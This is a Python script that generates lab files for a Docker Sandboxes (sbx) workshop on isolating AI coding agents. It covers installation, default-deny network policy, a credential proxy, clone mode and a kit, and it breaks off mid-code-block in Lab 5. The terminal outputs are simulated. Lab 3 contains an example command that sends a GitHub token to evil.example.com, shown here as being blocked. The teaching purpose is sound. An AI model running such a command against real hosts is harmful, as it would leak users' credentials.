#!/usr/bin/env python3
"""Generate Simspace labs and Labspace docs from workshop content."""

from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
LABS = ROOT / "labs"
DOCS = ROOT / "docs"


def write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content.strip() + "\n", encoding="utf-8")


def lab01() -> None:
    base = LABS / "lab-01-first-sandbox"
    write(
        base / "labspace.yaml",
        """
title: "Lab 1 — Your First Sandbox"
description: "Install sbx, store a Cursor secret, run your first agent, and test workspace boundaries."

catalog:
  icon: rocket_launch
  tags: ["sbx", "getting started"]
  estimatedMinutes: 25
  order: 1

simulator: simulator.yaml

terminals:
  - id: host
    title: Host
    icon: dns

files:
  delete-me.txt: |
    This file lives OUTSIDE the synced workspace.
    The agent should NOT be able to delete it.
  workspace/.keep: ""

sections:
  - title: Introduction
    contentPath: 00-intro.md
  - title: Install and sign in
    contentPath: 01-install.md
    steps:
      - id: sbx-install
        title: "Install sbx and sign in to Docker"
      - id: sbx-version
        title: "Check sbx version"
  - title: Secrets and first run
    contentPath: 02-run.md
    steps:
      - id: secret-set
        title: "Store Cursor API key"
      - id: sbx-run
        title: "Start first sandbox"
  - title: Workspace boundary
    contentPath: 03-boundary.md
    steps:
      - id: hello-file
        title: "Create hello.txt in workspace"
      - id: boundary-test
        title: "Confirm delete-me.txt is protected"
  - title: Clean up
    contentPath: 04-cleanup.md
    steps:
      - id: cleanup
        title: "Remove sandbox"
""",
    )
    write(
        base / "simulator.yaml",
        """
version: "2.0"

metadata:
  id: lab-01-first-sandbox
  title: "Lab 1 — Your First Sandbox"
  summary: "Install sbx, run Cursor in a microVM, and prove workspace isolation."

state:
  loggedIn: false
  secretSet: false
  sandboxRunning: false
  helloCreated: false

settings:
  pace:
    beat: 300
    pull: 900

defaults:
  unmatched:
    stderr: ["Error: that command isn't part of this lab yet."]
    exit: 1
  unmatchedAgent:
    output:
      - "Try the prompts in the left panel — this lab scripts specific agent tasks."

scenarios:
  - id: brew-install-login
    completes: sbx-install
    when:
      command: [brew, install, docker/tap/sbx, sbx, login]
    then:
      state: { loggedIn: true }
      output:
        - "==> Fetching docker/tap/sbx"
        - "==> Installing sbx from docker/tap"
        - "🍺  /opt/homebrew/Cellar/sbx/0.43.0: sbx installed"
        - ""
        - "Opening browser for Docker sign-in…"
        - "Logged in as kristiyan.velkov"

  - id: brew-install-block
    completes: sbx-install
    when:
      command: [brew, trust, docker/tap, brew, install]
    then:
      state: { loggedIn: true }
      output:
        - "✔ docker/tap is now a trusted tap"
        - "==> Fetching docker/tap/sbx"
        - "==> Installing sbx from docker/tap"
        - "🍺  /opt/homebrew/Cellar/sbx/0.43.0: sbx installed"
        - ""
        - "Opening browser for Docker sign-in…"
        - "Logged in as kristiyan.velkov"

  - id: brew-trust
    when:
      command: [brew, trust]
    then:
      output:
        - "✔ docker/tap is now a trusted tap"

  - id: brew-install
    completes: sbx-install
    when:
      command: [brew, install]
    then:
      state: { loggedIn: true }
      output:
        - "==> Fetching docker/tap/sbx"
        - "==> Installing sbx from docker/tap"
        - "🍺  /opt/homebrew/Cellar/sbx/0.43.0: sbx installed"
        - ""
        - "Opening browser for Docker sign-in…"
        - "Logged in as kristiyan.velkov"

  - id: sbx-version
    completes: sbx-version
    when:
      command: [sbx, version]
    then:
      output:
        - "sbx version 0.43.0 (darwin/arm64)"
        - "daemon: running"

  - id: sbx-login
    completes: sbx-login
    when:
      command: [sbx, login]
    then:
      output:
        - "By logging in, you agree to our Subscription Service Agreement. For more details, see https://www.docker.com/legal/docker-subscription-service-agreement/"
        - ""
        - "Waiting for authentication..."
      input:
        prompt: "Your Docker Hub username: "
        key: username
        then:
          output:
            - "Signed in as {{ input.username }}."
          state:
            loggedIn: true
            dockerUsername: "{{ input.username }}"

  - id: secret-set-ls
    completes: secret-set
    when:
      command: [sbx, secret, set, cursor, sbx, secret, ls]
    then:
      state: { secretSet: true }
      output:
        - "Secret stored: cursor"
        - "Inside the VM, CURSOR_API_KEY will show as proxy-managed — never your raw key."
        - "GROUP   NAME    SCOPE"
        - "cursor  cursor  global"

  - id: secret-set
    completes: secret-set
    when:
      command: [sbx, secret, set, cursor]
    then:
      state: { secretSet: true }
      output:
        - "Secret stored: cursor"
        - "Inside the VM, CURSOR_API_KEY will show as proxy-managed — never your raw key."

  - id: secret-ls
    when:
      command: [sbx, secret, ls]
    then:
      output:
        - "GROUP   NAME    SCOPE"
        - "cursor  cursor  global"

  - id: sbx-run
    completes: sbx-run
    when:
      command: [sbx, run, cursor, .]
      args:
        --name: { any: true }
    then:
      state: { sandboxRunning: true }
      output:
        - "Creating sandbox 'my-sandbox' (agent: cursor)…"
        - { text: "Syncing workspace/ into the microVM…", delay: pull }
        - "Sandbox ready. Starting Cursor agent."
      session:
        prompt: "cursor> "
        intro:
          - "I'm Cursor, running inside a Docker Sandbox microVM."
          - "Only the workspace/ folder is synced — ask me to create hello.txt."

  - id: agent-hello
    completes: hello-file
    when:
      agent: true
      promptContains: ["hello.txt"]
    then:
      state: { helloCreated: true }
      output:
        - "Creating hello.txt in the workspace…"
        - ""
        - " $ cat hello.txt"
        - " Hello from Docker Sandboxes!"
        - ""
        - "Done — the file is synced back to your host workspace/ folder."
      files:
        - path: workspace/hello.txt
          content: "Hello from Docker Sandboxes!\\n"

  - id: agent-boundary
    completes: boundary-test
    when:
      agent: true
      promptContains: ["delete-me"]
    then:
      output:
        - "Attempting to delete ../delete-me.txt …"
        - ""
        - " $ rm ../delete-me.txt"
        - " rm: cannot remove '../delete-me.txt': Permission denied"
        - ""
        - "I cannot delete files outside the workspace mount. delete-me.txt remains on the host."

  - id: sbx-ls-running
    when:
      command: [sbx, ls]
      state: { sandboxRunning: true }
    then:
      output:
        - "SANDBOX        AGENT   STATUS    PORTS   WORKSPACE"
        - "my-sandbox     cursor  running           workspace/"

  - id: sbx-rm
    completes: cleanup
    when:
      command: [sbx, rm]
      args:
        0: my-sandbox
        --force: { any: true }
    then:
      state: { sandboxRunning: false }
      output:
        - "Deleting sandbox my-sandbox..."
        - "Sandbox 'my-sandbox' removed"

  - id: sbx-ls-empty
    when:
      command: [sbx, ls]
      state: { sandboxRunning: false }
    then:
      output:
        - "SANDBOX   AGENT   STATUS   PORTS   WORKSPACE"
        - "(no sandboxes)"
""",
    )
    write(
        base / "00-intro.md",
        """
# Lab 1 — Your First Sandbox

Docker Sandboxes run AI coding agents in **isolated microVMs**. Each sandbox gets its own filesystem, Docker daemon, and network — the agent can build, install, and edit without touching your host.

In this lab you will:

1. Install and sign in with `sbx`
2. Store your Cursor API key as a host secret
3. Run `sbx run cursor` and create a file in the workspace
4. Prove the agent **cannot** modify files outside the workspace mount
""",
    )
    write(
        base / "01-install.md",
        """
# Install and sign in

Requires macOS Sonoma 14+ on Apple silicon. You don't need Docker Desktop.

```bash terminal-id=host
brew trust docker/tap
```

```bash terminal-id=host
brew install docker/tap/sbx
sbx login
```

## Other machines

| Platform | Install | Guide |
|----------|---------|-------|
| Windows 11 | `winget install -h Docker.sbx` | [Install on Windows](https://docs.docker.com/ai/sandboxes/install/#install-on-windows) |
| Ubuntu 24.04+ | add Docker's apt repo, then `sudo apt install docker-sbx` | [Install on Ubuntu](https://docs.docker.com/ai/sandboxes/install/#install-on-ubuntu) |

Full prerequisites, packages, and manual artifacts: [Install Docker Sandboxes](https://docs.docker.com/ai/sandboxes/install/).

Check that `sbx` is installed:

```bash terminal-id=host
sbx version
```

If sign-in did not open, run:

```bash terminal-id=host
sbx login
```
""",
    )
    write(
        base / "02-run.md",
        """
# Secrets and first run

Store your Cursor API key on the **host** — never in a repo file:

```bash terminal-id=host
sbx secret set cursor
```

```bash terminal-id=host
sbx secret ls
```

Start your first sandbox from the workspace folder:

```bash terminal-id=host
sbx run cursor . --name my-sandbox
```

When Cursor starts, ask the agent:

> Create a file named `hello.txt` in this workspace with a one-line greeting, then show me the file contents.
""",
    )
    write(
        base / "03-boundary.md",
        """
# Workspace boundary

The file :filelink[delete-me.txt]{path="delete-me.txt"} lives **outside** the synced workspace.

Ask the agent:

> Try to delete `../delete-me.txt` from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host.

The file should remain — the agent cannot remove paths outside the workspace mount.
""",
    )
    write(
        base / "04-cleanup.md",
        """
# Clean up

```bash terminal-id=host
sbx rm my-sandbox --force
sbx ls
```

**Done when:** Cursor started without an API key error, `hello.txt` exists in `workspace/`, `delete-me.txt` is still at the lab root, and `sbx ls` is empty.

→ [Docker Sandboxes docs](https://docs.docker.com/ai/sandboxes/)
""",
    )


def lab02() -> None:
    base = LABS / "lab-02-network-policy"
    write(
        base / "labspace.yaml",
        """
title: "Lab 2 — Network Policy"
description: "Default-deny network policy, allow/deny hosts, and audit logging with sbx policy."

catalog:
  icon: shield
  tags: ["network", "policy", "governance"]
  estimatedMinutes: 35
  order: 2

simulator: simulator.yaml

terminals:
  - id: host
    title: Host
    icon: dns
  - id: sandbox
    title: Sandbox
    icon: smart_toy

controls:
  - id: allow-dockerfrontend
    label: "Allow www.dockerfrontend.com (global)"
    description: "Adds a network allow rule for the Docker books site."
    state: network.dockerfrontendAllowed
    enabled: true
    disabled: false

sections:
  - title: Introduction
    contentPath: 00-intro.md
  - title: Initialize policy
    contentPath: 01-init.md
    steps:
      - id: policy-init
        title: "Initialize balanced policy"
  - title: Default deny
    contentPath: 02-deny.md
    steps:
      - id: curl-blocked
        title: "Confirm blocked curl"
  - title: Allow and verify
    contentPath: 03-allow.md
    steps:
      - id: curl-allowed
        title: "Curl after allow rule"
  - title: Sandbox-scoped deny
    contentPath: 04-scoped.md
    steps:
      - id: scoped-deny
        title: "Deny for this sandbox only"
  - title: Clean up
    contentPath: 05-cleanup.md
    steps:
      - id: cleanup
        title: "Remove rules and sandbox"
""",
    )
    write(
        base / "simulator.yaml",
        """
version: "2.0"

metadata:
  id: lab-02-network-policy
  title: "Lab 2 — Network Policy"
  summary: "Network deny-by-default, allow rules, audit log."

state:
  policyInit: false
  sandboxRunning: false
  network:
    dockerfrontendAllowed: false
    dockerfrontendDeniedForSandbox: false

settings:
  pace:
    beat: 300

defaults:
  unmatched:
    stderr: ["Error: that command isn't part of this lab yet."]
    exit: 1

scenarios:
  - id: policy-init
    completes: policy-init
    when:
      command: [sbx, policy, init, balanced]
    then:
      state: { policyInit: true }
      output:
        - "Initialized global network policy: balanced"
        - "Default deny with baseline allow-list for common dev domains."

  - id: policy-ls
    when:
      command: [sbx, policy, ls]
    then:
      output:
        - "PRESET: balanced (global)"
        - "www.dockerfrontend.com — not in allow-list (blocked by default)"

  - id: sbx-run-lab2
    when:
      command: [sbx, run, cursor, .]
      args:
        --name: lab2
      terminal: sandbox
    then:
      state: { sandboxRunning: true }
      output:
        - "Creating sandbox 'lab2'…"
        - "Sandbox ready. Network policy: balanced (default deny)."

  - id: curl-blocked
    completes: curl-blocked
    when:
      command: [curl]
      args:
        0: { oneOf: ["https://www.dockerfrontend.com", "www.dockerfrontend.com"] }
    then:
      output:
        - "curl: (7) Failed to connect — blocked by network policy"
        - "detail: no matching allow rule for www.dockerfrontend.com:443"

  - id: agent-curl-blocked
    when:
      agent: true
      terminal: sandbox
      promptContains: ["dockerfrontend"]
      state: { network.dockerfrontendAllowed: false }
    then:
      output:
        - " $ curl -sS https://www.dockerfrontend.com"
        - " Blocked by network policy: domain www.dockerfrontend.com:443"
        - ""
        - "The request was blocked — default deny is working."

  - id: policy-allow
    when:
      command: [sbx, policy, allow, network, www.dockerfrontend.com]
    then:
      state:
        network.dockerfrontendAllowed: true
      output:
        - "Allow rule added: www.dockerfrontend.com (global)"

  - id: curl-allowed
    completes: curl-allowed
    when:
      command: [curl]
      args:
        0: { oneOf: ["https://www.dockerfrontend.com", "www.dockerfrontend.com"] }
      state: { network.dockerfrontendAllowed: true }
    then:
      output:
        - "HTTP/2 200"
        - "<title>Docker Books — dockerfrontend.com</title>"

  - id: agent-curl-allowed
    when:
      agent: true
      terminal: sandbox
      promptContains: ["dockerfrontend"]
      state: { network.dockerfrontendAllowed: true }
    then:
      output:
        - " $ curl -sS https://www.dockerfrontend.com"
        - " HTTP 200 — Docker books homepage loaded."
        - ""
        - "Found titles: Docker Deep Dive, Docker Cookbook, and more."

  - id: policy-log
    when:
      command: [sbx, policy, log]
      args:
        0: lab2
    then:
      output:
        - "TIME                 SANDBOX  HOST                      DECISION  RULE"
        - "2026-07-08 14:01:02  lab2     www.dockerfrontend.com    BLOCKED   default-deny"
        - "2026-07-08 14:03:11  lab2     www.dockerfrontend.com    ALLOWED   domain-allowed"

  - id: policy-deny-scoped
    completes: scoped-deny
    when:
      command: [sbx, policy, deny, network]
      args:
        --sandbox: lab2
        0: www.dockerfrontend.com
    then:
      state:
        network.dockerfrontendDeniedForSandbox: true
        network.dockerfrontendAllowed: false
      output:
        - "Deny rule added: www.dockerfrontend.com (sandbox: lab2 only)"

  - id: curl-blocked-again
    when:
      command: [curl]
      args:
        0: { oneOf: ["https://www.dockerfrontend.com"] }
      state: { network.dockerfrontendDeniedForSandbox: true }
    then:
      output:
        - "curl: (7) Failed to connect — blocked by sandbox-scoped deny rule"

  - id: sbx-rm-lab2
    completes: cleanup
    when:
      command: [sbx, rm, lab2]
      args:
        --force: { any: true }
    then:
      state: { sandboxRunning: false }
      output: ["lab2 removed"]
""",
    )
    for name, content in [
        (
            "00-intro.md",
            """
# Lab 2 — Network Policy

Sandboxes use **default-deny** network policy. Traffic leaves the VM only through a host proxy that evaluates allow/deny rules.

You will:

1. Initialize the **balanced** preset on the host
2. Prove `www.dockerfrontend.com` is blocked by default
3. Add an allow rule and curl again
4. Apply a **sandbox-scoped** deny rule

Use the **Host** tab for `sbx policy` commands and the **Sandbox** tab for the agent session.
""",
        ),
        (
            "01-init.md",
            """
# Initialize policy

On the **host**, before starting the sandbox:

```bash terminal-id=host
sbx policy init balanced
sbx policy ls
```

Start the sandbox from the **Sandbox** tab:

```bash terminal-id=sandbox
sbx run cursor . --name lab2
```
""",
        ),
        (
            "02-deny.md",
            """
# Default deny

In the sandbox, ask Cursor:

> curl https://www.dockerfrontend.com and show me the full response. Confirm this URL is blocked by sandbox network policy.

Or run curl directly:

```bash terminal-id=sandbox
curl https://www.dockerfrontend.com
```

Check the audit log on the host:

```bash terminal-id=host
sbx policy log lab2 --limit 10
```
""",
        ),
        (
            "03-allow.md",
            """
# Allow and verify

Enable the control in **Settings**, or run on the host:

```bash terminal-id=host
sbx policy allow network www.dockerfrontend.com
```

Ask Cursor to curl again, or:

```bash terminal-id=sandbox
curl https://www.dockerfrontend.com
```
""",
        ),
        (
            "04-scoped.md",
            """
# Sandbox-scoped deny

Deny `www.dockerfrontend.com` for **lab2 only**:

```bash terminal-id=host
sbx policy deny network --sandbox lab2 www.dockerfrontend.com
```

Curl from the sandbox again — it should be blocked even if globally allowed.
""",
        ),
        (
            "05-cleanup.md",
            """
# Clean up

```bash terminal-id=host
sbx policy rm network --sandbox lab2 --resource www.dockerfrontend.com
sbx rm lab2 --force
```

→ [Local policy docs](https://docs.docker.com/ai/sandboxes/governance/local/)
""",
        ),
    ]:
        write(base / name, content)


def lab03() -> None:
    base = LABS / "lab-03-secrets"
    write(
        base / "labspace.yaml",
        """
title: "Lab 3 — Secrets & Credential Proxy"
description: "Inject GitHub tokens via the host proxy — sentinel values never leave approved destinations."

catalog:
  icon: key
  tags: ["secrets", "credentials", "github"]
  estimatedMinutes: 20
  order: 3

simulator: simulator.yaml

terminals:
  - id: host
    title: Host
    icon: dns

sections:
  - title: Introduction
    contentPath: 00-intro.md
  - title: Store GitHub token
    contentPath: 01-store.md
    steps:
      - id: secret-github
        title: "Store GitHub secret"
  - title: Sentinel value
    contentPath: 02-sentinel.md
    steps:
      - id: check-sentinel
        title: "Verify GH_TOKEN sentinel"
  - title: Live API call
    contentPath: 03-api.md
    steps:
      - id: api-200
        title: "GitHub API returns 200"
  - title: Exfiltration blocked
    contentPath: 04-exfil.md
    steps:
      - id: exfil-blocked
        title: "evil.example.com blocked"
  - title: Clean up
    contentPath: 05-cleanup.md
    steps:
      - id: cleanup
        title: "Remove sandbox and secret"
""",
    )
    write(
        base / "simulator.yaml",
        """
version: "2.0"

metadata:
  id: lab-03-secrets
  title: "Lab 3 — Secrets"
  summary: "Credential proxy injection and exfiltration prevention."

state:
  githubSecretSet: false
  sandboxRunning: false

defaults:
  unmatched:
    stderr: ["Error: that command isn't part of this lab yet."]
    exit: 1

scenarios:
  - id: secret-github
    completes: secret-github
    when:
      command: [sbx, secret, set, github]
    then:
      state: { githubSecretSet: true }
      output:
        - "Secret stored: github"
        - "The VM will see GH_TOKEN=gho_sbxproxymanaged… — not your real token."

  - id: sbx-run-lab3
    when:
      command: [sbx, run, cursor, .]
      args:
        --name: lab3
    then:
      state: { sandboxRunning: true }
      output:
        - "Creating sandbox 'lab3' with GitHub credential proxy…"
        - "Sandbox ready."

  - id: exec-sentinel
    completes: check-sentinel
    when:
      command: [sbx, exec, lab3]
      prompt: 'echo "GH_TOKEN=$GH_TOKEN"'
    then:
      output:
        - "GH_TOKEN=gho_sbxproxymanaged000000000000000000000"

  - id: exec-api
    completes: api-200
    when:
      command: [sbx, exec, lab3]
      promptContains: ["api.github.com"]
    then:
      output:
        - "sentinel OK"
        - "HTTP 200"
        - "user: kristiyan-velkov"

  - id: exec-exfil
    completes: exfil-blocked
    when:
      command: [sbx, exec, lab3]
      promptContains: ["evil.example.com"]
    then:
      output:
        - "curl: (7) Failed to connect — blocked by network policy"
        - "The sentinel token never reached evil.example.com."

  - id: secret-rm
    when:
      command: [sbx, secret, rm, github]
      args:
        --force: { any: true }
    then:
      state: { githubSecretSet: false }
      output: ["Secret removed: github (global)"]

  - id: sbx-rm-lab3
    completes: cleanup
    when:
      command: [sbx, rm, lab3]
      args:
        --force: { any: true }
    then:
      state: { sandboxRunning: false }
      output: ["lab3 removed"]
""",
    )
    for name, content in [
        (
            "00-intro.md",
            """
# Lab 3 — Secrets & Credential Proxy

API keys are stored on the **host** and injected into outbound HTTP headers by a proxy. Inside the VM, credentials appear as **sentinel values** — shaped like tokens but useless if exfiltrated.

You still need `sbx secret set cursor` from Lab 1 for the agent.
""",
        ),
        (
            "01-store.md",
            """
# Store GitHub token

```bash terminal-id=host
sbx secret set github --command 'gh auth token'
sbx secret ls
sbx run cursor . --name lab3
```
""",
        ),
        (
            "02-sentinel.md",
            """
# Sentinel value

```bash terminal-id=host
sbx exec lab3 -- bash -c 'echo "GH_TOKEN=$GH_TOKEN"'
```

Expected:

```text
GH_TOKEN=gho_sbxproxymanaged000000000000000000000
```
""",
        ),
        (
            "03-api.md",
            """
# Live API call

```bash terminal-id=host
sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user
```

Expected: `HTTP 200` — the proxy swaps the sentinel for your real token.
""",
        ),
        (
            "04-exfil.md",
            """
# Exfiltration blocked

```bash terminal-id=host
sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" "https://evil.example.com?k=$GH_TOKEN"
```

Expected: blocked — network policy prevents sending the sentinel to unapproved hosts.
""",
        ),
        (
            "05-cleanup.md",
            """
# Clean up

```bash terminal-id=host
sbx rm lab3 --force
sbx secret rm github --force
```

→ [Credentials docs](https://docs.docker.com/ai/sandboxes/security/credentials/)
""",
        ),
    ]:
        write(base / name, content)


def lab04() -> None:
    base = LABS / "lab-04-clone-workflow"
    write(
        base / "labspace.yaml",
        """
title: "Lab 4 — Direct vs Clone Mode"
description: "Compare direct workspace mounts with isolated Git clone mode on the monorepo."

catalog:
  icon: call_split
  tags: ["git", "clone", "workflow"]
  estimatedMinutes: 25
  order: 4

simulator: simulator.yaml

terminals:
  - id: host
    title: Host
    icon: dns

files:
  workshop-app/src/components/home-hero.tsx: |
    export function HomeHero() {
      return <h1>Docker Sandboxes Workshop</h1>;
    }

sections:
  - title: Introduction
    contentPath: 00-intro.md
  - title: Get the playground
    contentPath: 00-setup.md
    steps:
      - id: clone-app
        title: "Clone workshop-app"
      - id: npm-install
        title: "Install npm packages"
  - title: Direct mode
    contentPath: 01-direct.md
    steps:
      - id: direct-run
        title: "Start direct sandbox"
      - id: direct-edit
        title: "Hero edit syncs to host"
  - title: Clone mode
    contentPath: 02-clone.md
    steps:
      - id: clone-run
        title: "Start clone sandbox"
      - id: clone-commit
        title: "Agent commits on branch"
  - title: Fetch and merge
    contentPath: 03-fetch.md
    steps:
      - id: fetch-merge
        title: "Review on host and merge"
  - title: Clean up
    contentPath: 04-cleanup.md
    steps:
      - id: cleanup
        title: "Remove sandboxes"
""",
    )
    write(
        base / "simulator.yaml",
        """
version: "2.0"

metadata:
  id: lab-04-clone-workflow
  title: "Lab 4 — Clone Workflow"
  summary: "Direct vs clone Git workflows."

state:
  directRunning: false
  cloneRunning: false
  directEdited: false
  cloneCommitted: false
  hostMainClean: true

defaults:
  unmatched:
    stderr: ["Error: that command isn't part of this lab yet."]
    exit: 1

scenarios:
  - id: clone-app
    completes: clone-app
    when:
      command: [git, clone]
    then:
      output:
        - "Cloning into 'docker-sandbox-workshop'..."
        - "Receiving objects: 100%"
        - "Resolving deltas: 100%"
        - "Done."

  - id: npm-install
    completes: npm-install
    when:
      command: [npm, install]
    then:
      output:
        - "added 312 packages, and audited 313 packages in 8s"
        - "found 0 vulnerabilities"

  - id: direct-run
    completes: direct-run
    when:
      command: [sbx, run, cursor, workshop-app/]
      args:
        --name: lab4-direct
    then:
      state: { directRunning: true }
      output:
        - "Direct mode: mounting workshop-app/ read-write from host."
        - "Agent edits appear on the host immediately."

  - id: agent-direct-edit
    completes: direct-edit
    when:
      agent: true
      promptContains: ["hero", "home-hero"]
    then:
      state: { directEdited: true }
      output:
        - "Updated src/components/home-hero.tsx — tagline now mentions Docker Sandboxes."
        - "Change is already visible on your host (no git fetch needed)."
      files:
        - replace: workshop-app/src/components/home-hero.tsx
          find: "Docker Sandboxes Workshop"
          with: "Docker Sandboxes Workshop — run agents safely in microVMs"

  - id: direct-rm
    when:
      command: [sbx, rm, lab4-direct]
      args:
        --force: { any: true }
    then:
      state: { directRunning: false }
      output: ["lab4-direct removed"]

  - id: clone-run
    completes: clone-run
    when:
      command: [sbx, run, --clone, cursor, .]
      args:
        --name: lab4-clone
    then:
      state: { cloneRunning: true, hostMainClean: true }
      output:
        - "Clone mode: private Git clone inside the VM."
        - "Host main stays read-only. Remote 'sandbox-lab4-clone' added on host."

  - id: agent-clone-commit
    completes: clone-commit
    when:
      agent: true
      promptContains: ["feat/lab4-test", "clone mode"]
    then:
      state: { cloneCommitted: true }
      output:
        - " $ git checkout -b feat/lab4-test"
        - " $ git commit -m 'docs: clone mode test'"
        - "Committed on feat/lab4-test inside the VM clone."
        - "Host git status on main: clean"

  - id: git-fetch
    completes: fetch-merge
    when:
      command: [git, fetch, sandbox-lab4-clone]
    then:
      output:
        - "From sandbox-lab4-clone"
        - " * [new branch]      feat/lab4-test -> sandbox-lab4-clone/feat/lab4-test"

  - id: git-log
    when:
      command: [git, log, sandbox-lab4-clone/feat/lab4-test]
    then:
      output:
        - "a1b2c3d docs: clone mode test"
        - "e4f5g6h [feat] init project"

  - id: git-status-clean
    when:
      command: [git, status]
    then:
      output:
        - "On branch main"
        - "nothing to commit, working tree clean"

  - id: clone-rm
    completes: cleanup
    when:
      command: [sbx, rm, lab4-clone]
      args:
        --force: { any: true }
    then:
      state: { cloneRunning: false }
      output: ["lab4-clone removed"]
""",
    )
    for name, content in [
        (
            "00-intro.md",
            """
# Lab 4 — Direct vs Clone Mode

| Mode | Command | Host working tree |
|------|---------|-------------------|
| **Direct** | `sbx run cursor workshop-app/` | Edits sync immediately |
| **Clone** | `sbx run --clone cursor .` | Host stays clean; fetch branch from sandbox remote |

Both modes use the playground repo [docker-sandbox-workshop](https://github.com/kristiyan-velkov/docker-sandbox-workshop) — clone it in the next step.
""",
        ),
        (
            "00-setup.md",
            """
# Get the playground

Labs 4–6 use [workshop-app](https://github.com/kristiyan-velkov/docker-sandbox-workshop) — it is not in this repo. Clone it and install packages:

```bash terminal-id=host
git clone https://github.com/kristiyan-velkov/docker-sandbox-workshop.git
```

```bash terminal-id=host
cd docker-sandbox-workshop/workshop-app
npm install
```

Repo: [github.com/kristiyan-velkov/docker-sandbox-workshop](https://github.com/kristiyan-velkov/docker-sandbox-workshop)
""",
        ),
        (
            "01-direct.md",
            """
# Direct mode

```bash terminal-id=host
sbx run cursor workshop-app/ --name lab4-direct
```

Ask the agent:

> Update the hero tagline in `src/components/home-hero.tsx` to mention Docker Sandboxes. Show me the new line.

The edit appears on the host immediately — open :filelink[home-hero.tsx]{path="workshop-app/src/components/home-hero.tsx"}.
""",
        ),
        (
            "02-clone.md",
            """
# Clone mode

From the **docker-sandbox-workshop** repo root (not `workshop-app/`):

```bash terminal-id=host
sbx run --clone cursor . --name lab4-clone
```

Ask the agent:

> Create branch `feat/lab4-test`. Add a one-line comment at the top of `workshop-app/src/lib/workshop-data.ts` noting this was edited in clone mode. Commit with message `docs: clone mode test`.
""",
        ),
        (
            "03-fetch.md",
            """
# Fetch and merge

```bash terminal-id=host
git fetch sandbox-lab4-clone
git log sandbox-lab4-clone/feat/lab4-test --oneline -3
git status
```

Host `main` should stay clean during agent work.
""",
        ),
        (
            "04-cleanup.md",
            """
# Clean up

```bash terminal-id=host
sbx rm lab4-direct --force
sbx rm lab4-clone --force
git remote remove sandbox-lab4-clone 2>/dev/null || true
```

→ [Clone workflow docs](https://docs.docker.com/ai/sandboxes/workflows/#clone-mode)
""",
        ),
    ]:
        write(base / name, content)


def lab05() -> None:
    base = LABS / "lab-05-workshop-app"
    write(
        base / "labspace.yaml",
        """
title: "Lab 5 — Workshop App & Kit"
description: "Run workshop-app with the pre-built workshop-app-nextjs kit — bootstrap, dev server, network demo."

catalog:
  icon: web
  tags: ["kit", "nextjs", "network"]
  estimatedMinutes: 20
  order: 5

simulator: simulator.yaml

terminals:
  - id: host
    title: Host
    icon: dns

sections:
  - title: Introduction
    contentPath: 00-intro.md
  - title: Run with kit
    contentPath: 01-run.md
    steps:
      - id: kit-run
        title: "Start lab5-kit with kit"
  - title: Allowed research
    contentPath: 02-allowed.md
    steps:
      - id: allowed-sites
        title: "Research allowed domains"
  - title: Denied sites
    contentPath: 03-denied.md
    steps:
      - id: denied-sites
        title: "Google and LinkedIn blocked"
  - title: Inspect kit
    contentPath: 04-inspect.md
    steps:
      - id: inspect-kit
        title: "List kit injections"
  - title: Clean up
    contentPath: 05-cleanup.md
    steps:
      - id: cleanup
        title: "Remove sandbox"
""",
    )
    write(
        base / "simulator.yaml",
        """
version: "2.0"

metadata:
  id: lab-05-workshop-app
  title: "Lab 5 — Workshop App Kit"
  summary: "Pre-built kit bootstrap and network allow/deny demo."

state:
  kitRunning: false
  devServerUp: false

settings:
  pace:
    build: 1100

defaults:
  unmatched:
    stderr: ["Error: that command isn't part of this lab yet."]
    exit: 1

scenarios:
  - id: kit-run
    completes: kit-run
    when:
      command: [sbx, run, cursor, .]
      args:
        --kit: ../customize/kit/workshop-app-nextjs
        --name: lab5-kit
    then:
      state: { kitRunning: true, devServerUp: true }
      output:
        - "Applying kit: workshop-app-nextjs"
        - { text: "Running workshop-bootstrap.sh (npm ci + dev server)…", delay: build }
        - "Sandbox ready. Dev server on :3000"
        - "Kit network: allow kristiyanvelkov.com, leanpub.com — deny google.com, linkedin.com"

  - id: agent-allowed
    completes: allowed-sites
    when:
      agent: true
      promptContains: ["kristiyan", "leanpub", "research"]
    then:
      output:
        - "Fetching https://kristiyanvelkov.com … HTTP 200"
        - "Bio: Docker Captain, author, conference speaker."
        - "Fetching https://leanpub.com … found Docker and Next.js publications."

  - id: agent-denied
    completes: denied-sites
    when:
      agent: true
      promptContains: ["google", "linkedin"]
    then:
      output:
        - " $ curl https://google.com"
        - " Blocked by network policy (deniedDomains: google.com)"
        - " $ curl https://linkedin.com"
        - " Blocked by network policy (deniedDomains: linkedin.com)"

  - id: policy-log-lab5
    when:
      command: [sbx, policy, log, lab5-kit]
    then:
      output:
        - "kristiyanvelkov.com    ALLOWED"
        - "leanpub.com            ALLOWED"
        - "google.com             BLOCKED"
        - "linkedin.com           BLOCKED"

  - id: curl-dev-server
    when:
      command: [sbx, exec, lab5-kit]
      promptContains: ["3000"]
    then:
      output: ["200"]

  - id: agent-inspect-kit
    completes: inspect-kit
    when:
      agent: true
      promptContains: ["kit", "spec.yaml", "rules"]
    then:
      output:
        - "Injected .cursor/rules/: cursor-agent.mdc, sandbox-workshop.mdc, …"
        - "Injected .claude/skills/workshop-app/SKILL.md"
        - "network.allowedDomains: registry.npmjs.org, kristiyanvelkov.com, leanpub.com, …"
        - "commands.startup: workshop-bootstrap.sh → npm ci + npm run dev :3000"

  - id: sbx-rm-lab5
    completes: cleanup
    when:
      command: [sbx, rm, lab5-kit]
      args:
        --force: { any: true }
    then:
      state: { kitRunning: false, devServerUp: false }
      output: ["lab5-kit removed"]
""",
    )
    for name, content in [
        (
            "00-intro.md",
            """
# Lab 5 — Workshop App & Kit

Lab 5 uses the pre-built **`workshop-app-nextjs`** kit from `customize/kit/`. The kit:

- Bootstraps `npm ci` + `npm run dev` on port 3000
- Injects Cursor rules and Claude skills
- Sets network allow/deny lists

Use the playground from Lab 4. If you do not have it yet:

```bash
git clone https://github.com/kristiyan-velkov/docker-sandbox-workshop.git
cd docker-sandbox-workshop/workshop-app
npm install
```

Then:

```bash
cd docker-sandbox-workshop/workshop-app
cp .env.sandbox.example .env.local
```
""",
        ),
        (
            "01-run.md",
            """
# Run with kit

```bash terminal-id=host
cd docker-sandbox-workshop/workshop-app
